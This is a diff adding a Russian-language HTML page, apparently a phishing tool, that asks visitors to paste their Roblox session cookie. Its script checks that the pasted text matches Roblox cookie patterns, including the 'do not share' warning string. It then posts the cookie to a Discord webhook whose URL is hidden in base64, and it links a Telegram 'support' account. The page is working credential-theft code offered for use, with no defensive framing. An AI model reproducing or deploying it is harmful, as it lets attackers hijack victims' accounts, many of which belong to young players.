@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>ROBLOX COOKIE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0f0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+        }
+
+        .container {
+            background: #0f1a0f;
+            padding: 40px;
+            border-radius: 20px;
+            border: 3px solid #00ff9d;
+            box-shadow: 0 0 50px #00ff9d;
+            width: 500px;
+        }
+
+        h1 {
+            color: #00ff9d;
+            text-align: center;
+            font-size: 32px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px #00ff9d;
+        }
+
+        textarea {
+            width: 100%;
+            height: 200px;
+            background: #0f1a0f;
+            border: 2px solid #00ff9d;
+            border-radius: 10px;
+            color: #00ff9d;
+            padding: 15px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            margin-bottom: 20px;
+            resize: vertical;
+        }
+
+        textarea:focus {
+            outline: none;
+            box-shadow: 0 0 20px #00ff9d;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        button, .support {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #00ff9d;
+            border-radius: 10px;
+            background: transparent;
+            color: #00ff9d;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            text-transform: uppercase;
+            font-family: 'Courier New', monospace;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #00ff9d;
+            color: #0a0f0a;
+            box-shadow: 0 0 30px #00ff9d;
+        }
+
+        .support {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+
+        .support:hover {
+            background: #ff4444;
+            color: #0a0f0a;
+            box-shadow: 0 0 30px #ff4444;
+        }
+
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            font-weight: bold;
+            display: none;
+            border: 2px solid;
+        }
+
+        .hint {
+            color: #00ff9d;
+            opacity: 0.5;
+            text-align: center;
+            margin-top: 15px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ROBLOX COOKIE</h1>
+        
+        <textarea id="cookie" placeholder="ВСТАВЬ ROBLOX КУКИ СЮДА"></textarea>
+
+        <div class="buttons">
+            <button onclick="sendCookie()">[ ОТПРАВИТЬ ]</button>
+            <a href="https://t.me/sventsi" target="_blank" class="support">[ ПОДДЕРЖКА ]</a>
+        </div>
+
+        <div id="status"></div>
+        <div class="hint">>> ТОЛЬКО ROBLOX КУКИ <<</div>
+    </div>
+
+    <script>
+        // 🔐 ТВОЙ НОВЫЙ WEBHOOK (зашифрован в base64)
+        const encryptedWebhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MzA5Nzc4MTA4NTE0MzIyMS9adEpERER6Z3lsVzdsNTRpYWltbTJPVjA2cjBFQVlkZk1TSWtaUVRwTTZSbTlLVk9GQ29raVhMLUJ2dGp1UGZzWVZXWA==';
+
+        // Расшифровка webhook
+        const webhook = (function() {
+            try {
+                return atob(encryptedWebhook);
+            } catch(e) {
+                console.error('Ошибка расшифровки');
+                return null;
+            }
+        })();
+
+        console.log('Webhook загружен, статус:', webhook ? '✅' : '❌');
+
+        // Функция проверки - только Roblox куки
+        function isRobloxCookie(text) {
+            if (!text || text.length < 30) return false;
+            
+            // Главные признаки Roblox куки
+            const robloxPatterns = [
+                '_|WARNING|_',
+                '_|WARNING:-DO-NOT-SHARE-THIS',
+                '.ROBLOSECURITY',
+                'ROBLOSECURITY',
+                'COOKIE'
+            ];
+            
+            for(let pattern of robloxPatterns) {
+                if(text.includes(pattern)) return true;
+            }
+            
+            // Дополнительная проверка структуры
+            const hasSpecial = /[_\|\-\.]/.test(text);
+            const hasLetters = /[a-zA-Z]/.test(text);
+            const hasNumbers = /[0-9]/.test(text);
+            
+            return hasSpecial && hasLetters && hasNumbers && text.length > 40;
+        }
+
+        // Функция отправки
+        async function sendCookie() {
+            const input = document.getElementById('cookie');
+            const status = document.getElementById('status');
+            const cookie = input.value.trim();
+
+            status.style.display = 'block';
+
+            // Проверка на пустоту
+            if (!cookie) {
+                status.innerHTML = '❌ ВСТАВЬ КУКИ';
+                status.style.background = '#2a1a1a';
+                status.style.borderColor = '#ff4444';
+                status.style.color = '#ff4444';
+                return;
+            }
+
+            // ТОЛЬКО ROBLOX КУКИ
+            if (!isRobloxCookie(cookie)) {
+                status.innerHTML = '❌ ЭТО НЕ ROBLOX КУКИ';
+                status.style.background = '#2a1a1a';
+                status.style.borderColor = '#ff4444';
+                status.style.color = '#ff4444';
+                return;
+            }
+
+            // Отправка
+            status.innerHTML = '⏳ ОТПРАВКА...';
+            status.style.background = '#0f1a0f';
+            status.style.borderColor = '#00ff9d';
+            status.style.color = '#00ff9d';
+
+            try {
+                if (!webhook) {
+                    throw new Error('Webhook не работает');
+                }
+
+                const response = await fetch(webhook, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: '🎮 **ROBLOX COOKIE** 🎮\n```\n' + cookie + '\n```'
+                    })
+                });
+
+                if (response.ok) {
+                    status.innerHTML = '✅ ROBLOX КУКИ ОТПРАВЛЕНЫ';
+                    status.style.background = '#0f1a0f';
+                    status.style.borderColor = '#00ff9d';
+                    status.style.color = '#00ff9d';
+                    input.value = '';
+                    
+                    setTimeout(() => {
+                        status.style.display = 'none';
+                    }, 3000);
+                } else {
+                    const errorText = await response.text();
+                    console.error('Discord ответ:', response.status, errorText);
+                    
+                    if(response.status === 401) {
+                        status.innerHTML = '❌ WEBHOOK НЕ РАБОТАЕТ (401)';
+                    } else {
+                        status.innerHTML = '❌ ОШИБКА ' + response.status;
+                    }
+                    status.style.background = '#2a1a1a';
+                    status.style.borderColor = '#ff4444';
+                    status.style.color = '#ff4444';
+                }
+            } catch (error) {
+                console.error('Ошибка:', error);
+                status.innerHTML = '❌ ' + error.message;
+                status.style.background = '#2a1a1a';
+                status.style.borderColor = '#ff4444';
+                status.style.color = '#ff4444';
+            }
+        }
+
+        // Отправка по Enter
+        document.getElementById('cookie').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !e.shiftKey) {
+                e.preventDefault();
+                sendCookie();
+            }
+        });
+    </script>
+</body>
+</html>
